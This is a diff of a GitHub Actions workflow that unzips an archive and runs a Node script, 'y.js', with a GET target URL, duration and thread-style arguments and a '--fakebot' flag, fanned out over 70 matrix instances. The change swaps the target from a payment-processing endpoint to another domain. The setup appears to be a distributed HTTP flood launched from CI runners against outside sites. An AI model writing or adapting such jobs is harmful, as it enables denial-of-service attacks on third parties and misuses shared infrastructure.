@@ -41,7 +41,7 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           cd Fc-main
-          node y.js GET  https://payment-processing.net/payer/v1/deposits/d28f2721-5dfd-40e4-aadb-b8654f315342  200 4 90 --debug --fakebot --full
+          node y.js GET  https://djobiden.space/689ada4f-8e55-4b11-9cdd-eab463573f13 300 4 60 --debug --fakebot 
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
